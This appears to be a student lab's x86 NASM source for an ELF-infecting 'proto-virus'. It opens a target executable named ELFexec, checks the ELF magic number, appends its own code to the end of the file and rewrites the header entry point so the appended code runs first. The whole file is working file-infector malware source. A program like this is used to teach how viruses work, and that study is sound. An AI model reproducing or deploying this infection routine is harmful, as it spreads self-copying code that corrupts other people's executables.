%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            	; Set up ebp and reserve space on the stack for local storage

	;################################ print this is a virus ################################
	call get_my_lock				; eax - contains address for get_my_lock
	add eax, virus_msg - next_i		; address of virus message
	write 1, eax, virus_msg_len		; 1-stdout | eax-pointer to string | virus_msg_len - len of bytes to write

	;###################################### open file ######################################
	call get_my_lock				; eax - contains address for get_my_lock
	add eax, FileName - next_i		; address of virus message FileName
	open eax, RDWR, 0777			; open file
	cmp eax, -1						; check if fd is=<1 than an error occured
	jle handling_openFileErrorMsg	; handling error on opening file
	
	;###################################### check ELF #####################################
	checkELF:
	mov edi, eax						; save fd to edi
	lea ebx, [ebp-STK_RES]				; get pointer to ebp-200
	read eax, ebx, 52					; read from fd (eax) to ebp-200(ebx) 52 bytes (magic number)
	cmp dword [ebp-STK_RES], 0x464C457F	; check .ELF at the start of the file
	jne handling_notELFErrorMsg	
	;###################################### copy code #####################################
	
	lseek edi, 0, SEEK_SET					; return to the start of the file eax=fd 0=byte SEEK_SET=saved content
	lseek edi, 0, SEEK_END					; seek end to copy code
	mov esi, eax							; save
	write edi, _start, virus_end - _start	; eax contains now number of bytes

	;##################################### copy header #####################################
	lseek edi, 0, SEEK_SET					; return to the start of the file eax=fd 0=byte SEEK_SET=saved content
	add esi, 0x08048000						; add to esi the starting address to get "real address" (this is out new EP)
	mov [ebp - STK_RES + ENTRY], esi 		; modify the new EP locally
	lea esi, [ebp-STK_RES]					; set esi to point on the start of the data we want to write to the new file
	write edi, esi, 52 						; write our modified Magic Number containing the new EP to the file
	

	close edi								; close file
VirusExit:
       exit 0            			; Termination if all is OK and no previous code to jump to
                         			; (also an example for use of above macros)


;##################################### print\errors handling #####################################
handling_openFileErrorMsg:
	call get_my_lock						; eax - contains address for get_my_lock
	add eax, openFileErrorMsg - next_i		; address of virus message
	write 1, eax, openFileErrorMsg_len
	jmp VirusExit

handling_notELFErrorMsg:
	close edi							; close file using fd
	call get_my_lock					; eax - contains address for get_my_lock
	add eax, notELF_msg - next_i		; address of virus message
	write 1, eax, notELF_msg_len
	jmp VirusExit

;###################################### my_lock fuc ######################################
get_my_lock:
	call next_i
next_i:
	pop eax
	ret

;;strings
openFileErrorMsg:	db "ERROR: Could not open file ELFexec", 10, 0
openFileErrorMsg_len equ $-openFileErrorMsg
virus_msg:  db "This is a virus", 10, 0
virus_msg_len equ $-virus_msg
notELF_msg:  db "ERROR: not ELF file format", 10, 0
notELF_msg_len equ $-notELF_msg
;;
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

PreviousEntryPoint: dd VirusExit
virus_end:


